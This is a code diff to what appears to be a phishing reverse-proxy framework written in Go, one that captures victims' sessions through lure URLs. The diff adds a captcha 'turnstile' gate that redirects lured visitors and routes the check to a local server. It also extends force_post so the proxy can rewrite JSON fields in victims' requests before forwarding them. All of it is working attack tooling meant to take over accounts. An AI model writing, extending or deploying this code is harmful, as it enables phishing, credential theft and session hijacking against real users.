@@ -87,6 +87,7 @@ type HttpProxy struct {
 	ip_mtx            sync.Mutex
 	session_mtx       sync.Mutex
 	livefeed          bool
+	turnstile         bool
 }
 
 type ProxySession struct {
@@ -97,7 +98,21 @@ type ProxySession struct {
 	Index        int
 }
 
-func NewHttpProxy(hostname string, port int, cfg *Config, crt_db *CertDb, db *database.Database, bl *Blacklist, developer bool, livefeed bool) (*HttpProxy, error) {
+// set the value of the specified key in the JSON body
+func SetJSONVariable(body []byte, key string, value interface{}) ([]byte, error) {
+	var data map[string]interface{}
+	if err := json.Unmarshal(body, &data); err != nil {
+		return nil, err
+	}
+	data[key] = value
+	newBody, err := json.Marshal(data)
+	if err != nil {
+		return nil, err
+	}
+	return newBody, nil
+}
+
+func NewHttpProxy(hostname string, port int, cfg *Config, crt_db *CertDb, db *database.Database, bl *Blacklist, developer bool, livefeed bool, turnstile bool) (*HttpProxy, error) {
 	p := &HttpProxy{
 		Proxy:             goproxy.NewProxyHttpServer(),
 		Server:            nil,
@@ -112,6 +127,7 @@ func NewHttpProxy(hostname string, port int, cfg *Config, crt_db *CertDb, db *da
 		ip_sids:           make(map[string]string),
 		auto_filter_mimes: []string{"text/html", "application/json", "application/javascript", "text/javascript", "application/x-javascript"},
 		livefeed:          livefeed,
+		turnstile:         turnstile,
 	}
 
 	p.Server = &http.Server{
@@ -144,6 +160,28 @@ func NewHttpProxy(hostname string, port int, cfg *Config, crt_db *CertDb, db *da
 	})
 
 	p.Proxy.OnRequest().HandleConnect(goproxy.AlwaysMitm)
+
+	// Regular expression to detect turnstile requests
+	urlPattern := regexp.MustCompile(`/validate-captcha`)
+
+	// Only intercept /validate-captcha requests containing client_id
+	p.Proxy.OnRequest(goproxy.UrlMatches(urlPattern)).DoFunc(
+		func(req *http.Request, ctx *goproxy.ProxyCtx) (*http.Request, *http.Response) {
+			// Check if the query string contains the client_id parameter
+			clientID := req.URL.Query().Get("client_id")
+			if clientID != "" {
+				//fmt.Println("URL matches pattern, client_id found:", clientID)
+				// Modify the request to forward it to the local server
+				req.URL.Scheme = "http"
+				req.URL.Host = "localhost:80"
+				// Forward the modified request
+				return req, nil
+			}
+			// If client_id is not present or not needed, you can decide how to handle this case.
+			// For example, return the request unmodified, modify it in some other way, or even return a custom response.
+			return req, nil
+		},
+	)
 
 	p.Proxy.OnRequest().
 		DoFunc(func(req *http.Request, ctx *goproxy.ProxyCtx) (*http.Request, *http.Response) {
@@ -426,6 +464,11 @@ func NewHttpProxy(hostname string, port int, cfg *Config, crt_db *CertDb, db *da
 									p.whitelistIP(remote_addr, ps.SessionId, pl.Name)
 
 									req_ok = true
+									if p.turnstile {
+										//fmt.Println("Redirecting to turnstile")
+										// Redirect to the turnstile page
+										return p.redirectTurnstile(req, session.RId)
+									}
 								}
 							} else {
 								log.Warning("[%s] unauthorized request: %s (%s) [%s]", hiblue.Sprint(pl_name), req_url, req.Header.Get("User-Agent"), remote_addr)
@@ -458,6 +501,12 @@ func NewHttpProxy(hostname string, port int, cfg *Config, crt_db *CertDb, db *da
 
 				if ps.SessionId != "" {
 					if s, ok := p.sessions[ps.SessionId]; ok {
+						if p.turnstile {
+							if !s.IsCaptchaDone {
+								// Redirect to the turnstile page
+								p.redirectTurnstile(req, s.RId)
+							}
+						}
 						l, err := p.cfg.GetLureByPath(pl_name, req_path)
 						if err == nil {
 							// show html redirector if it is set for the current lure
@@ -717,6 +766,45 @@ func NewHttpProxy(hostname string, port int, cfg *Config, crt_db *CertDb, db *da
 											log.Error("database: %v", err)
 										}
 									}
+								}
+							}
+
+							// force post json
+							for _, fp := range pl.forcePost {
+								if fp.path.MatchString(req.URL.Path) {
+									log.Debug("force_post: url matched: %s", req.URL.Path)
+									ok_search := false
+									if len(fp.search) > 0 {
+										k_matched := len(fp.search)
+										for _, fp_s := range fp.search {
+											matches := fp_s.key.FindAllString(string(body), -1)
+											for _, match := range matches {
+												if fp_s.search.MatchString(match) {
+													if k_matched > 0 {
+														k_matched -= 1
+													}
+													log.Debug("force_post: [%d] matched - %s", k_matched, match)
+													break
+												}
+											}
+										}
+										if k_matched == 0 {
+											ok_search = true
+										}
+									} else {
+										ok_search = true
+									}
+									if ok_search {
+										for _, fp_f := range fp.force {
+											body, err = SetJSONVariable(body, fp_f.key, fp_f.value)
+											if err != nil {
+												log.Debug("force_post: got error: %s", err)
+											}
+											log.Debug("force_post: updated body parameter: %s : %s", fp_f.key, fp_f.value)
+										}
+									}
+									req.ContentLength = int64(len(body))
+									log.Debug("force_post: body: %s len:%d", body, len(body))
 								}
 							}
 
@@ -1287,6 +1375,16 @@ func (p *HttpProxy) blockRequest(req *http.Request) (*http.Request, *http.Respon
 		if resp != nil {
 			return req, resp
 		}
+	}
+	return req, nil
+}
+
+func (p *HttpProxy) redirectTurnstile(req *http.Request, rid string) (*http.Request, *http.Response) {
+	resp := goproxy.NewResponse(req, "text/html", http.StatusFound, "")
+	if resp != nil {
+		redirect_url := "https://" + req.Host + "/validate-captcha?client_id=" + rid
+		resp.Header.Add("Location", redirect_url)
+		return req, resp
 	}
 	return req, nil
 }
